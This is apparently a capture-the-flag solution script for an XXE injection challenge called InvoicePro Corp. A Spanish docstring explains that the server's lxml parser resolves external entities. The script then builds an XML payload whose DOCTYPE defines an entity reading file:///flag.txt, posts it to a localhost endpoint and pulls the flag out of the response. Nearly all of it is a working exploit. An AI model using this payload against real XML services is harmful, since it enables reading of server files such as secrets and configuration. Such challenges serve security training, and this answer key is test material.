"""
Solución: XXE Injection — InvoicePro Corp
=========================================

El servidor usa lxml con resolve_entities=True, lo que permite definir
entidades externas en el DOCTYPE y hacer que el parser las resuelva.

Payload XXE clásico para leer /flag.txt:

    <?xml version="1.0"?>
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "file:///flag.txt">
    ]>
    <invoice>
      <id>&xxe;</id>
    </invoice>

El parser reemplaza &xxe; con el contenido del archivo antes de
extraer el texto, que luego aparece en la respuesta HTTP.
"""
import requests

BASE = 'http://localhost:8080'

xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<invoice>
  <id>&xxe;</id>
  <amount>1.00</amount>
  <vendor>Exploit Ltd</vendor>
</invoice>"""

print("[*] Enviando payload XXE...")
r = requests.post(f'{BASE}/process', data={'xml_data': xxe_payload})

if 'CTF{' in r.text:
    import re
    match = re.search(r'CTF\{[^}]+\}', r.text)
    if match:
        print(f"[+] Flag encontrada: {match.group(0)}")
else:
    print("[*] Respuesta completa:")
    print(r.text)
